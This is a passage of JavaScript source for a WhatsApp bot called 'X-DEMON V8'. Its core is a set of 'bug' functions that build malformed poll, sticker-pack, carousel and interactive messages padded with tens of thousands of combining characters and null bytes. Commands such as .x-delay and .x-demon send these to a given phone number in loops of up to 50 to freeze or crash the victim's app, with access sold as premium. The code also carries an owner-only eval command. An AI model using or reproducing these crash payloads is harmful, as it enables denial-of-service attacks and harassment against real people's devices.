  options.push({
    optionName: name[r],
    optionHash: null
  });
}
const msg = generateWAMessageFromContent(m.chat, {
  pollCreationMessageV4: {
    message: {
      pollCreationMessageV3: {
        name: "💤⃟⃰ϟ\n\n" + "\x10". repeat(2000),
        options: [
          {
            optionName: "execute" + "ꦽ".repeat(2000),
            optionHash: toHash(mediaBuffer1)
          },
          {
            optionName: "null" + "⃟⃰".repeat(2000),
            optionHash: toHash(mediaBuffer2)
          }
        ],
        selectableOptionsCount: 0,
        pollContentType: 2,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          participant: "13135550001@s.whatsapp.net",
          remoteJid: "status@broadcast",
          isBroadcast: true,
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: true,
            id: "ABCDEF1234567890"
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          },
          dataSharingContext: {
            showMmDisclosure: true
          },
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "@iichacan",
                format: 1
              },
              nativeFlowResponseMessage: {
                name: "payment_methode",
                paramsJson: "",
                version: 3
              }
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterName: "© running since 2020 to 20##?",
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            contentType: "UPDATE",
            accessibilityText: ""
          }
        },
        viewOnce: true,
        annotations: [
          {
            polygonVertices: [
              { x: 60.71664810180664, y: -36.39784622192383 },
              { x: -16.710189819335938, y: 49.263675689697266 },
              { x: -56.585853576660156, y: 37.85963439941406 },
              { x: 20.840980529785156, y: -47.80188751220703 }
            ],
            newsletter: {
              newsletterJid: "120363321780343299@newsletter",
              newsletterName: "-i'am icha",
              contentType: "UPDATE",
              accessibilityText: ""
            }
          }
        ]
      },
      pollType: "POLL"
    }
  }
}, { participant: { jid: target } });
await xrelly.relayMessage(target, msg.message, {
  messageId: msg.key.id
});
}
async function XStromFreezeUi(target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];
  const ButtonsFreeze = [
    { name: "single_select", buttonParamsJson: "" }
  ];
  for (let i = 0; i < 10; i++) {
    ButtonsFreeze.push(
      {
        name: "payment_method",
        buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(0x2710)},\"payment_timestamp\":null,\"share_payment_status\":true}`
      },
      { name: "review_order", buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "review_and_pay", buttonParamsJson: JSON.stringify({ status: true }) }
    );
  }
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [target],
            remoteJid: "X",
            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
              }
            }
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  title: "⃟⃰".repeat(20000),
                  hasMediaAttachment: true,
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                    fileLength: "9999999999999",
                    height: 9999,
                    width: 9999,
                    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1755254367"
                  }
                },
                body: { text: "⃟⃰".repeat(2000) + "\u0000".repeat(5000) },
                footer: { text: "⃟⃰".repeat(2000) + "\u0000".repeat(5000) },
                nativeFlowMessage: {
                  buttons: ButtonsFreeze,
                  messageParamsJson: "[{".repeat(10000)
                }
              }
            ]
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    additionalNodes: Node,
    participant: { jid: target },
  });
}
async function newBetaxxx(xrelly, target, mention = false) {
let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
        },
      },
    },
  };
  
    let biji = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "You Idiot's",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
    
			let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "- xrelly",
								locationMessage: {
								  degreesLatitude: -9.09999262999,
								  degreesLongitude: 199.99963118999,
								  jpegThumbnail: null,
								  name: "💤⃟⃰ᰧ./𝘅𝗿𝗹.𝛆𝛘𝛆" + "\u0000".repeat(15000),
								  address: "́💤⃟⃰ᰧ./𝘅𝗿𝗹.𝛆𝛘𝛆" + "\u0000".repeat(5000),
								  url: `https://xrl.xxx.${"\u0000".repeat(25000)}.com`,
								  contextInfo: {
				            forwardingScore: 999999,
                    isForwarded: true,
                    mentionedJid: [
                      "6285215587438@s.whatsapp.net", ...Array.from({ length: 20 }, () => `1${Math.floor(Math.random() * 500000)}@
                      s.whatsapp.net`)
                      ],
                    forwardedNewsletterMessageInfo: {
                      newsletterJid: "0000000000@newsletter",
                      severMessageId: "1",
                      newsletterName: "# How Do I Get Through This ?",
                      contentType: "LINK_CARD"
                    }				    
								  }
								},
								hasMediaAttachment: true
							},
							body: {
								text: "\u0000".repeat(10000)
							},
							nativeFlowMessage: {
							  name: "call_permission_message",
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}), {});    

const janda = generateWAMessageFromContent(target, message, {});

await xrelly.relayMessage("status@broadcast", janda.message, {
        messageId: janda.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500)
     if (mention) {
        await xrelly.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: janda.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await xrelly.relayMessage("status@broadcast", biji.message, {
        messageId: biji.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });

    await sleep(500);

    if (mention) {
        await xrelly.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: biji.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    
    await xrelly.relayMessage("status@broadcast", etc.message, {
        messageId: etc.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });

    await sleep(500);

    if (mention) {
        await xrelly.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: etc.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }    
}
async function newUixrl(xrelly, target) {
    xrelly.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: false,
                            title: "Xrl.exe\n\n" + "ꦽ".repeat(50000),
                        },
                        body: {
                            text: "",
                        },
                        nativeFlowMessage: {
                            name: "single_select",
                            messageParamsJson: "",
                        },
                        payment: {
                            name: "galaxy_message",
                            messageParamsJson: "{\"icon\":\"DOCUMENT\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}",
                        },
                    },
                },
            },
        },
        {}
    );
}
async function snithBlank(botx, target) {
  await botx.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "S",
        name: "𝑸𝒖𝒊 𝒆́𝒔 𝑺𝒏𝒊𝒕𝒉" + "؂ن؃؄ٽ؂ن؃".repeat(15000),
        publisher: "𝑸𝒖𝒊 𝒆́𝒔 𝑺𝒏𝒊𝒕𝒉" + "؂ن؃؄ٽ؂ن؃".repeat(15000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "stx",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "𝑸𝒖𝒊 𝒆́𝒔 𝑺𝒏𝒊𝒕𝒉" + "؂ن؃؄ٽ؂ن؃".repeat(15000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}
switch (command) {
case 'menu': {
  let anjay = `
╭─────> ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ｣
┃さ *Developer : Icha Chan*
┃さ *Name Bot : 𝚇-𝙳𝙴𝙼𝙾𝙽 𝚅𝟾*
┃さ *Action : t.me/iichacan*
┃さ *Version : 8.0.0*
┃さ *Status : ${sock.public ? "Public" : "Self"}*
┃さ *Time : ${tggl()} ${jam()}*
╰──────────────────━
╭━───━> ｢ 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 ｣
┃さ *.x-force 62xxx*
┃╰┄> \`Infinity 1 Msg\`
┃さ *.x-delay 62xxx*
┃╰┄> \`Delay Hard\`
┃さ *.x-blank 62xxx*
┃╰┄> \`Blank Click\`
┃さ *.x-demon 62xxx*
┃╰┄> \`⚠️ Tidak Disarankan\`
╰──────────────────━
╭─────> ｢ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ｣
┃さ *.addprem 62xxx*
┃さ *.delprem 62xxx*
┃さ *.self*
┃さ *.public*
┃さ *.hidetag*
╰──────────────────━
╭─────> ｢ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ｣
┃さ *.tofunc*
┃さ *.tourl*
╰──────────────────━`
  let x = {
    text: anjay,
    footer: '© 𝚇-𝙳𝙴𝙼𝙾𝙽 𝚅𝟾 ',
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      mentionedJid: [m.sender],
      forwardedNewsletterMessageInfo: {
        newsletterJid: "1@newsletter",
        serverMessageId: 1,
        newsletterName: "𝙳𝙴𝙼𝙾𝙽 𝚅𝟾 || 𝙸𝙲𝙷𝙰 𝙲𝙰𝙽𝚃𝙸𝙺",
        newsletterType: "PUBLIC"
       },
      externalAdReply: {
          title: "© 𝚇-𝙳𝙴𝙼𝙾𝙽 𝚅𝟾",
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true,
          containsAutoReply: false,
          body: "© ICHA CHAN",
          thumbnail: await getThumb(),
          sourceUrl: "https://t.me/iichacan",
          ctwaClid: "ctwaClid",
          ref: "ref",
          clickToWhatsappCall: true,
          ctaPayload: "ctaPayload",
          disableNudge: true,
          originalImageUrl: null
        }
      }
    }
await sock.sendMessage(m.chat, x, { quoted: qsock, AI: true })
}
break;
case 'x-force': {
if (!isPremium && !Access) return sockreply('`[ ! ] access is denied, you don\'t have access`')
if (!q) return sockreply(`*Example: ${prefix + command} 62×××*`)
const target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
sReact("⌛")
for (let i = 0; i < 3; i++) {
 await InfinitySql(sock, target);
 }
sReact("✅")
}
break;
case 'x-demon': {
if (!isPremium && !Access) return sockreply('`[ ! ] access is denied, you don\'t have access`')
if (!q) return sockreply(`*Example: ${prefix + command} 62×××*`)
const target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
sReact("⌛")
for (let i = 0; i < 30; i++) {
 await BugDoc(target);
 await Flood2(target);
 await Flood1(target);
 await sleep(1000)
 await BugLetters(target);
 await BugPrimrose(target);
 await BugUI(target);
 await sleep(1000)
 await BugLiveLoc(target);
 await BugLoc(target);
 await sleep(1000)
 await snithBlank(sock, target);
 await newUixrl(sock, target);
 await sleep(1000)
 await XStromFreezeUi(sock, target);
 await pollingBugs(sock, target);
 await sleep(1000)
 await urlNew(sock, target)
 await sleep(500)
 }
sReact("✅")
}
break;
case 'x-delay': {
if (!isPremium && !Access) return sockreply('`[ ! ] access is denied, you don\'t have access`')
if (!q) return sockreply(`*Example: ${prefix + command} 62×××*`)
const target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
sReact("⌛")
for (let i = 0; i < 50; i++) {
 await newBetaxxx(sock, target, true);
 await StickerSplit(sock, target);
 await sleep(1000)
  }
sReact("✅")
}
break;
case 'x-blank': {
if (!isPremium && !Access) return sockreply('`[ ! ] access is denied, you don\'t have access`')
if (!q) return sockreply(`*Example: ${prefix + command} 62×××*`)
const target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
sReact("⌛")
for (let i = 0; i < 50; i++) {
 await snithBlank(sock, target);
 await newUixrl(sock, target);
 await sleep(1000)
 await XStromFreezeUi(sock, target);
 await pollingBugs(sock, target);
 await sleep(1000)
 await urlNew(sock, target)
 await sleep(500)
 }
sReact("✅")
}
break;
case 'tourl': {await toUrl(sock, m)}
break;
case 'addprem': {
if (!Access) return sockreply('[ ! ] Only the Owner can use it')
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return sockreply(`Contoh : ${prefix + command} no/@tag|30d`)
    if (!hari) return sockreply(`mau berapa hari?`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return sockreply('owner kan bebas')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return sockreply('Suscesfully add premium✅')
    let data = await sock.onWhatsApp(users)
    if (data[0].exists) {
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = ('Suscesfully add premium✅')
        const contentText = {
            text: teks,
            contextInfo: {	
                externalAdReply: {
                    title: `[ Premium Only ]`,
                    previewType: "PHOTO",
                    thumbnailUrl: image,
                    sourceUrl: 'https://whatsapp.com/channel/0029VanRJcU7NoaADR1oyb2v'
                }	
            }	
        };	
        return sock.sendMessage(m.chat, contentText, { quoted: qsock })
    } else {		
         sockreply("not found")
    }	
}
break

case 'delprem': {
if (!Access) return sockreply('[ ! ] Only the Owner can use it')
    if (!args[0]) return sockreply(`Contoh : ${prefix + command} no/@tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return sockreply("bukan user premium")
    let data = await sock.onWhatsApp(users)
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./惡魔/系統/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./惡魔/系統/database/premium.json', JSON.stringify(premium))		
        sockreply('user tersebut telah di hapus')
    } else {	
        sockreply("not found")
    }
}
break
case 'tofunc': {
   if (!isPremium && !Access) return sockreply('`[ ! ] access is denied, you don\'t have access`')
   if (!m.quoted) return sockreply("❌ Reply pesan yang berisi media!")
   try {
      let q = m.quoted
      let mime = (q.msg || q).mimetype || ''
      if (!mime) return sockreply("❌ Media tidak ditemukan!")
      let buffer = await q.download()
      if (!buffer) return sockreply("❌ Gagal download media!")
      let sentMsg = await sock.sendMessage(sock.user.id, { 
         [mime.split('/')[0]]: buffer, 
         mimetype: mime 
      })
      if (!sentMsg?.message) throw new Error("No response from WA")
      let messageType = Object.keys(sentMsg.message)[0]
      let media = sentMsg.message[messageType]
      let content = `${messageType}: {
  url: "${media.url || ""}",
  directPath: "${media.directPath || ""}",
  mimetype: "${media.mimetype || ""}",
  mediaKey: "${media.mediaKey?.toString('base64') || ""}",
  fileEncSha256: "${media.fileEncSha256?.toString('base64') || ""}",
  fileSha256: "${media.fileSha256?.toString('base64') || ""}",
  fileLength: "${media.fileLength || ""}",
  mediaKeyTimestamp: "${media.mediaKeyTimestamp || ""}"
}`
      await sock.sendMessage(m.chat, {
         document: Buffer.from(content, "utf-8"),
         fileName: messageType + ".json",
         mimetype: "application/json",
         caption: "> sucses",
         contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
            showAdAttribution: true,
            renderLargerThumbnail: false,
            title: `© 𝚇-𝙳𝙴𝙼𝙾𝙽 𝚅𝟾 `,
            body: `© ICHA CHAN`,
            previewType: "VIDEO",
            thumbnailUrl: "https://files.catbox.moe/rwuuzb.jpg",
            sourceUrl: `t.me/iichacan`,
           }
         }
      }, { quoted: qsock })
   } catch (err) {
      sock.sendMessage(m.chat, { text: `❌ Gagal mengambil media!\nError: ${err.message}` }, { quoted: m })
   }
}
break;
case "hidetag": case "tagall": case "h": {
  if (!isGroup) return sockreply("Fitur ini hanya bisa digunakan di grup.");

  if (!text) return sockreply(`Contoh:\n${prefix + command} Halo semua`)
  let metadata = await sock.groupMetadata(m.chat);
  let participants = metadata.participants.map(p => p.id);

  await sock.sendMessage(m.chat, {
    text: text,
    mentions: participants
  }, { quoted: qsock });
}
  break;

case "public": { 
if (!Access) return await sock.sendMessage(m.chat, {
  audio: fs.readFileSync('./media/khusus.mp3'),
  mimetype: 'audio/mpeg',
  ptt: true
}, { quoted: qsock });
sock.public = true
sockreply(`*\`Succes Change Mode Bot To Public\`*`)
}
break

case "self": { 
if (!Access) return await sock.sendMessage(m.chat, {
  audio: fs.readFileSync('./media/khusus.mp3'),
  mimetype: 'audio/mpeg',
  ptt: true
}, { quoted: qsock });
sock.public = false
sockreply(`*\`Succes Change Mode Bot To Self\`*`)
}
break

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
